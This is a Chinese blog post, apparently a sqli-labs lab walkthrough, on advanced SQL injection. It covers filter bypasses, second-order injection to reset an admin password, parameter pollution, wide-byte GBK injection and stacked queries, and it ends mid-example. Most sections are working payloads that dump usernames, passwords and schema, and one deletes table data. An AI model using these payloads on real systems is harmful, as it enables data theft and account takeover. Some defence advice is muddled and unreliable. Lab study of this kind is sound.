@@ -1,0 +1,1129 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="高阶sql注入, FightingTree">
+    <meta name="description" content="1.过滤字符1.1 过滤注释符号1.1.1 Less-231.判断类型
+get型注入
+有回显 (联合注入)
+有错误提示
+
+综上考虑联合注入
+2. 找注入点?id=1 //正常
+?id=1&amp;#39; //报错
+?id=1&amp;#39; and 1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>高阶sql注入 | FightingTree</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">FightingTree</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于我</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">FightingTree</div>
+        <div class="logo-desc">
+            
+            No pains, No gains.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于我
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                友情链接
+            </a>
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/fightingtree/fightingtree.github.io" class="waves-effect waves-light" target="_blank">
+                <i class="fa fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #c2185b;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/fightingtree/fightingtree.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://pic.superbed.cn/item/5db3fa668b58bc7bf71e5255.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        高阶sql注入
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #c2185b;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #c2185b;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #c2185b;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 20px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E5%AE%89%E5%85%A8/" target="_blank">
+                                <span class="chip bg-color">安全</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E5%AE%89%E5%85%A8/" class="post-category" target="_blank">
+                                安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-07-22
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        2.8k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        11 分
+                    </div>
+                    
+                
+				
+				
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="1-过滤字符"><a href="#1-过滤字符" class="headerlink" title="1.过滤字符"></a>1.过滤字符</h2><h3 id="1-1-过滤注释符号"><a href="#1-1-过滤注释符号" class="headerlink" title="1.1 过滤注释符号"></a>1.1 过滤注释符号</h3><h4 id="1-1-1-Less-23"><a href="#1-1-1-Less-23" class="headerlink" title="1.1.1 Less-23"></a>1.1.1 Less-23</h4><h5 id="1-判断类型"><a href="#1-判断类型" class="headerlink" title="1.判断类型"></a>1.判断类型</h5><ul>
+<li>get型注入</li>
+<li>有回显 (联合注入)</li>
+<li>有错误提示</li>
+</ul>
+<p>综上考虑联合注入</p>
+<h5 id="2-找注入点"><a href="#2-找注入点" class="headerlink" title="2. 找注入点"></a>2. 找注入点</h5><pre><code>?id=1 //正常
+?id=1&#39; //报错
+?id=1&#39; and 1=1--+ //报错
+?id=1&#39; and 1=2--+ //报错</code></pre><p>此时判断注释符号可能被过滤，尝试加入第二个‘</p>
+<pre><code>?id=1&#39; and &#39;1&#39;=&#39;1   //正常
+?id=1&#39; and &#39;1&#39;=&#39;2   //错误</code></pre><p>由上可知注释符号被过滤，需采用’ 进行注入</p>
+<h5 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h5><pre><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+$result=mysql_query($sql);
+$row = mysql_fetch_array($result);
+
+    if($row)
+    {
+      echo &#39;&lt;font color= &quot;#0000ff&quot;&gt;&#39;;    
+      echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
+      echo &quot;&lt;br&gt;&quot;;
+      echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
+      echo &quot;&lt;/font&gt;&quot;;
+      }
+    else 
+    {
+    echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
+    print_r(mysql_error());
+    echo &quot;&lt;/font&gt;&quot;;  
+    }
+}
+    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}
+
+?&gt;</code></pre><h5 id="3-判断字段数"><a href="#3-判断字段数" class="headerlink" title="3. 判断字段数"></a>3. 判断字段数</h5><pre><code>?id=1&#39; order by 3,&#39;1    //正常
+?id=1&#39; order by 4,&#39;1    //错误</code></pre><p><img src="https://pic.downk.cc/item/5f18e9a914195aa594dded34.png" alt=""></p>
+<h4 id="4-判断显示位"><a href="#4-判断显示位" class="headerlink" title="4. 判断显示位"></a>4. 判断显示位</h4><pre><code>?id=-1&#39; union select 1,2,&#39;3</code></pre><p><img src="https://pic.downk.cc/item/5f18e9f214195aa594de109f.png" alt=""></p>
+<h5 id="5-用户名-密码-数据库版本号-数据库"><a href="#5-用户名-密码-数据库版本号-数据库" class="headerlink" title="5.用户名/密码/数据库版本号/数据库"></a>5.用户名/密码/数据库版本号/数据库</h5><pre><code>?id=-1&#39; union select 1,user(),database()&#39;</code></pre><p><img src="https://pic.downk.cc/item/5f18ea9214195aa594de6023.png" alt=""></p>
+<h5 id="6-爆表"><a href="#6-爆表" class="headerlink" title="6.爆表"></a>6.爆表</h5><pre><code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security</code></pre><p><img src="https://pic.downk.cc/item/5f18eb6c14195aa594dec7f2.png" alt=""></p>
+<h5 id="7-爆列"><a href="#7-爆列" class="headerlink" title="7. 爆列"></a>7. 爆列</h5><pre><code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users</code></pre><p><img src="https://pic.downk.cc/item/5f18ebf214195aa594df042b.png" alt=""></p>
+<h5 id="8-爆数据"><a href="#8-爆数据" class="headerlink" title="8.爆数据"></a>8.爆数据</h5><pre><code>?id=-1&#39; union select 1,username,password from users where id =&#39;3</code></pre><p><img src="https://pic.downk.cc/item/5f18ec7714195aa594df435f.png" alt=""></p>
+<h3 id="1-2-过滤逻辑运算符"><a href="#1-2-过滤逻辑运算符" class="headerlink" title="1.2 过滤逻辑运算符"></a>1.2 过滤逻辑运算符</h3><p>主要过滤or/and等字符，主要有以下几种处理方式：</p>
+<ul>
+<li><p>大小写变形 Or,OR,oR </p>
+</li>
+<li><p>编码，hex，urlencode </p>
+</li>
+<li><p>添加注释/<em>or</em>/ </p>
+</li>
+<li><p>利用符号 and=&amp;&amp;    or=||</p>
+</li>
+</ul>
+<h4 id="1-2-1-Less-25a"><a href="#1-2-1-Less-25a" class="headerlink" title="1.2.1 Less-25a"></a>1.2.1 Less-25a</h4><h5 id="1-判断类型-1"><a href="#1-判断类型-1" class="headerlink" title="1.判断类型"></a>1.判断类型</h5><ul>
+<li>get型注入</li>
+<li>有回显</li>
+<li>无错误提示</li>
+</ul>
+<p>综上考虑联合注入</p>
+<h5 id="2-找注入点-1"><a href="#2-找注入点-1" class="headerlink" title="2.找注入点"></a>2.找注入点</h5><pre><code>?id=1&#39;  //错误
+?id=1&#39;--+ //错误，可能过滤注释符号
+?id=1&#39; and &#39;1&#39;=&#39;1 //错误,可能过滤逻辑运算符
+?id=1&#39; &amp;&amp; 1=1--+ //错误
+?id=1&#39; &amp;&amp; &#39;1&#39;=&#39;1  </code></pre><h3 id="1-3-过滤空格"><a href="#1-3-过滤空格" class="headerlink" title="1.3 过滤空格"></a>1.3 过滤空格</h3><blockquote>
+<p>注：关键字过滤也要随之更改空格格式</p>
+</blockquote>
+<ul>
+<li><p>%09  TAB 键（水平） </p>
+</li>
+<li><p>%0a  新建一行 </p>
+</li>
+<li><p>%0c  新的一页 </p>
+</li>
+<li><p>%0d  return 功能 </p>
+</li>
+<li><p>%0b TAB 键（垂直） </p>
+</li>
+<li><p>%a0  空格</p>
+</li>
+</ul>
+<h3 id="1-4-过滤sql语句关键字"><a href="#1-4-过滤sql语句关键字" class="headerlink" title="1.4 过滤sql语句关键字"></a>1.4 过滤sql语句关键字</h3><h4 id="1-4-1-Less-27"><a href="#1-4-1-Less-27" class="headerlink" title="1.4.1 Less-27"></a>1.4.1 Less-27</h4><h5 id="1-判断类型-2"><a href="#1-判断类型-2" class="headerlink" title="1.判断类型"></a>1.判断类型</h5><ul>
+<li>get型注入</li>
+<li>有回显</li>
+<li>有错误提示</li>
+</ul>
+<p>综上考虑联合注入</p>
+<h5 id="2-找注入点-确认过滤符号"><a href="#2-找注入点-确认过滤符号" class="headerlink" title="2.找注入点,确认过滤符号"></a>2.找注入点,确认过滤符号</h5><pre><code>?id=1&#39; //报错
+?id=1&#39;--+ //报错，可能是过滤--+
+?id=1&#39; and &#39;1&#39;=&#39;1  //正常，确认过滤--+，不过滤逻辑运算符</code></pre><h5 id="3-字段数"><a href="#3-字段数" class="headerlink" title="3.字段数"></a>3.字段数</h5><pre><code>?id=0&#39;%a0order%a0by%a04||&#39;1   //空白</code></pre><p>字段爆不出，考虑Updatexml()错误盲注</p>
+<h5 id="4-爆库"><a href="#4-爆库" class="headerlink" title="4. 爆库"></a>4. 爆库</h5><pre><code>?id=1&#39;%a0and%a0updatexml(1,concat(0x7e,database(),0x7e),1)||&#39;1</code></pre><p><img src="https://pic.downk.cc/item/5f191eb514195aa59407d4d5.png" alt=""></p>
+<p>爆表爆字段爆数据同基于错误的盲注，只不过在语句后要加上||’1</p>
+<h2 id="2-二阶注入"><a href="#2-二阶注入" class="headerlink" title="2.二阶注入"></a>2.二阶注入</h2><h3 id="2-1-概述"><a href="#2-1-概述" class="headerlink" title="2.1 概述"></a>2.1 概述</h3><ol>
+<li><p>黑客通过构造数据的形式，在浏览器或者其他软件中提交 HTTP 数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的 SQL 语句或者命令。 </p>
+</li>
+<li><p>服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。</p>
+</li>
+<li><p>黑客向服务端发送第二个与第一次不相同的请求数据信息。 </p>
+</li>
+<li><p>服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的 SQL 语句或者命令在服务端环境中执行。 </p>
+</li>
+<li><p>服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注 入漏洞利用是否成功。</p>
+</li>
+</ol>
+<h3 id="2-2-从注册入手"><a href="#2-2-从注册入手" class="headerlink" title="2.2 从注册入手"></a>2.2 从注册入手</h3><h4 id="2-1-1-Less-24"><a href="#2-1-1-Less-24" class="headerlink" title="2.1.1 Less-24"></a>2.1.1 Less-24</h4><h5 id="1-判断类型-3"><a href="#1-判断类型-3" class="headerlink" title="1.判断类型"></a>1.判断类型</h5><ul>
+<li>post型注入</li>
+<li>无回显</li>
+<li>有错误提示</li>
+</ul>
+<p>综上考虑基于错误的盲注</p>
+<h5 id="2-找注入点-2"><a href="#2-找注入点-2" class="headerlink" title="2. 找注入点"></a>2. 找注入点</h5><p>尝试所有注入且考虑注释符号被过滤，均尝试不成功，于是考虑二阶注入。</p>
+<h5 id="3-注册新用户"><a href="#3-注册新用户" class="headerlink" title="3. 注册新用户"></a>3. 注册新用户</h5><p><img src="https://pic.downk.cc/item/5f18f17814195aa594e2feaa.png" alt=""></p>
+<h5 id="4-使用上述新建的用户登录并修改密码"><a href="#4-使用上述新建的用户登录并修改密码" class="headerlink" title="4. 使用上述新建的用户登录并修改密码"></a>4. 使用上述新建的用户登录并修改密码</h5><p>查看修改密码源码：</p>
+<pre><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;;</code></pre><p>当我们使用admin’#用户进行登录时，修改密码的sql语句变成：</p>
+<pre><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39; &quot;;</code></pre><p>上述语句即可随意修改admin的密码</p>
+<h2 id="3-参数污染"><a href="#3-参数污染" class="headerlink" title="3. 参数污染"></a>3. 参数污染</h2><h3 id="3-1-服务器两层架构"><a href="#3-1-服务器两层架构" class="headerlink" title="3.1 服务器两层架构"></a>3.1 服务器两层架构</h3><p><img src="https://pic.downk.cc/item/5f192fd714195aa59414c1c4.png" alt=""></p>
+<ul>
+<li>服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。</li>
+<li>工作流程为：client 访问服务器,能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回路径则相反。 </li>
+</ul>
+<h3 id="3-2-场景应用"><a href="#3-2-场景应用" class="headerlink" title="3.2 场景应用"></a>3.2 场景应用</h3><p>index.jsp?id=1&amp;id=2 请求，针对3.1图中的服务器配置情况，客户端请求首先过 tomcat，tomcat 解析第一个参数，接下来 tomcat 去请求 apache（php） 服务器，apache 解析最后一个参数。最终返回客户端的是2这个参数，因为实际上提供服务的是apache(php)服务器，返回的数据也应该是 apache 处理的数据。为什么还要有tomcat服务器呢？</p>
+<ul>
+<li><p>我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一 </p>
+<p>个 WAF。</p>
+</li>
+</ul>
+<p>而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。该用法就 是 HPP（HTTP Parameter Pollution），http 参数污染攻击的一个应用。HPP 可对服务器和客 户端都能够造成一定的威胁</p>
+<h3 id="3-3-实例"><a href="#3-3-实例" class="headerlink" title="3.3 实例"></a>3.3 实例</h3><h4 id="3-3-1-Less-29"><a href="#3-3-1-Less-29" class="headerlink" title="3.3.1 Less-29"></a>3.3.1 Less-29</h4><p>查看apache服务器的Index.php源码，如图所示</p>
+<p><img src="https://pic.downk.cc/item/5f19337314195aa59416f44a.png" alt=""></p>
+<p>由上述源码可知，apache服务器只对tomcat的参数进行了处理，所以我们可以利用第二个参数进行注入攻击</p>
+<pre><code>?id=1&amp;id=-1&#39; union select 1,user(),3--+</code></pre><h2 id="4-宽字节注入"><a href="#4-宽字节注入" class="headerlink" title="4. 宽字节注入"></a>4. 宽字节注入</h2><h3 id="4-1-原理概述"><a href="#4-1-原理概述" class="headerlink" title="4.1 原理概述"></a>4.1 原理概述</h3><p>原理：mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思路是将 ‘ 转换为 \’ 。我们绕过过滤的思路就是把’前面的\去除掉：</p>
+<ul>
+<li>%df 吃掉 \ 具体的原因是 urlencode(\ ‘)= %5c%27，我们在%5c%27 前面添加%df，形成%df%5c%27，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此时%df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。</li>
+<li>将 \’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 的情况，后面的%5c 会被前面的%5c给注释掉。这也是 bypass 的一种方法。</li>
+</ul>
+<blockquote>
+<p>注：此种情况下若使用联合注入，所有字段的内容都要使用GBK编码才能成功攻击，如table_schema=’security’要换成table_schema=0x7365637572697479，且宽字节注入中get方法与post方法采取的方法不同</p>
+</blockquote>
+<h3 id="4-2-源码分析"><a href="#4-2-源码分析" class="headerlink" title="4.2 源码分析"></a>4.2 源码分析</h3><pre><code>function check_addslashes($string)
+{
+    $string = preg_replace(&#39;/&#39;. preg_quote(&#39;\\&#39;) .&#39;/&#39;, &quot;\\\\\\&quot;, $string);          //escape any backslash
+    $string = preg_replace(&#39;/\&#39;/i&#39;, &#39;\\\&#39;&#39;, $string);                               //escape single quote with a backslash
+    $string = preg_replace(&#39;/\&quot;/&#39;, &quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash
+
+
+    return $string;
+}
+
+// take the variables 
+if(isset($_GET[&#39;id&#39;]))
+{
+$id=check_addslashes($_GET[&#39;id&#39;]);</code></pre><p>此处过滤函数采用addslashes()，addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。 </p>
+<p>预定义字符是： </p>
+<ul>
+<li><p>单引号（’） </p>
+</li>
+<li><p>双引号（”） </p>
+</li>
+<li><p>反斜杠（\） </p>
+</li>
+</ul>
+<h3 id="4-3-实例"><a href="#4-3-实例" class="headerlink" title="4.3 实例"></a>4.3 实例</h3><h4 id="4-3-1-Less-32-get方法"><a href="#4-3-1-Less-32-get方法" class="headerlink" title="4.3.1 Less-32(get方法)"></a>4.3.1 Less-32(get方法)</h4><h5 id="1-判断类型-4"><a href="#1-判断类型-4" class="headerlink" title="1.判断类型"></a>1.判断类型</h5><ul>
+<li>get型注入(url数据会通过URLencode)</li>
+<li>有回显</li>
+<li>有错误提示</li>
+</ul>
+<h5 id="2-找注入点-3"><a href="#2-找注入点-3" class="headerlink" title="2.找注入点"></a>2.找注入点</h5><pre><code>?id=1&#39; //正常
+?id=1&quot; //正常</code></pre><p>由上图可知过滤引号，此处采取%df吃\的方法</p>
+<pre><code>?id=1%df&#39; //错误</code></pre><p><img src="https://pic.downk.cc/item/5f19386514195aa5941ab943.png" alt=""></p>
+<p>正常报错，继续寻找注入点</p>
+<pre><code>?id=1%df&#39; and 1=1--+  //正常
+?id=1%df&#39; and 1=2--+   //返回空串</code></pre><p>综上，注入点为?id=1%df’ 且不过滤空格逻辑运算符注释</p>
+<h5 id="3-爆列"><a href="#3-爆列" class="headerlink" title="3. 爆列"></a>3. 爆列</h5><pre><code>?id=-1%df&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x7573657273--+</code></pre><p><img src="https://pic.downk.cc/item/5f193dcc14195aa5941eee5d.png" alt=""></p>
+<p>其余同联合注入</p>
+<h5 id="4-防御"><a href="#4-防御" class="headerlink" title="4.防御"></a>4.防御</h5><p>使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，才能防御此漏洞。</p>
+<pre><code>Mysql_query(“SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary”,$conn);</code></pre><h4 id="4-3-2-Less-34-post方法"><a href="#4-3-2-Less-34-post方法" class="headerlink" title="4.3.2 Less-34(post方法)"></a>4.3.2 Less-34(post方法)</h4><p>post类型（将’ 转换为 utf-16 或 utf-32，例如将 ‘ 转为 utf-16 为 �‘）</p>
+<pre><code>username:�&#39; or 1=1#
+password: 随便填</code></pre><h4 id="4-3-1-Less-36"><a href="#4-3-1-Less-36" class="headerlink" title="4.3.1 Less-36"></a>4.3.1 Less-36</h4><h5 id="1-源代码"><a href="#1-源代码" class="headerlink" title="1. 源代码"></a>1. 源代码</h5><pre><code>function check_quotes($string)
+{
+    $string= mysql_real_escape_string($string);    
+    return $string;
+}
+
+// take the variables 
+if(isset($_GET[&#39;id&#39;]))
+{
+$id=check_quotes($_GET[&#39;id&#39;]);</code></pre><p>上面的 check_quotes()函数是利用了 mysql_real_escape_string()函数进行的过滤。 </p>
+<p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。 </p>
+<p>下列字符受影响： </p>
+<ul>
+<li><p>\x00 </p>
+</li>
+<li><p>\n </p>
+</li>
+<li><p>\r </p>
+</li>
+<li><p>\ </p>
+</li>
+<li><p>‘ </p>
+</li>
+<li><p>“ </p>
+</li>
+<li><p>\x1a </p>
+</li>
+</ul>
+<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p>
+<h5 id="2-突破"><a href="#2-突破" class="headerlink" title="2. 突破"></a>2. 突破</h5><p>但是因 mysql 我们并没有设置成 gbk，所以mysql_real_escape_string()依旧能够被突破：</p>
+<ul>
+<li>将’编码为utf-16</li>
+</ul>
+<pre><code>?id=-1%EF%BF%BD&#39; union select 1,user(),3--+</code></pre><ul>
+<li>使用%df吃\</li>
+</ul>
+<pre><code>?id=-1%df&#39; union select 1,user(),3--+</code></pre><h5 id="3-防护"><a href="#3-防护" class="headerlink" title="3. 防护"></a>3. 防护</h5><p>在使用 mysql_real_escape_string()时，如何能够安全的防护这种问题，需要将 mysql 设置为 gbk 即可。 设置代码： </p>
+<pre><code>Mysql_set_charset(‘gbk’,’$conn’)</code></pre><h2 id="5-Stacked-Injection-堆叠注入"><a href="#5-Stacked-Injection-堆叠注入" class="headerlink" title="5. Stacked Injection 堆叠注入"></a>5. Stacked Injection 堆叠注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于 union或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是 任意的语句。</p>
+<p>例如：</p>
+<blockquote>
+<p>用户输入： </p>
+<p>1; DELETE FROM products </p>
+<p>服务器端生成的 sql 语句为：（因未对输入的参数进行过滤） </p>
+<p>Select * from products where productid=1;DELETE FROM products</p>
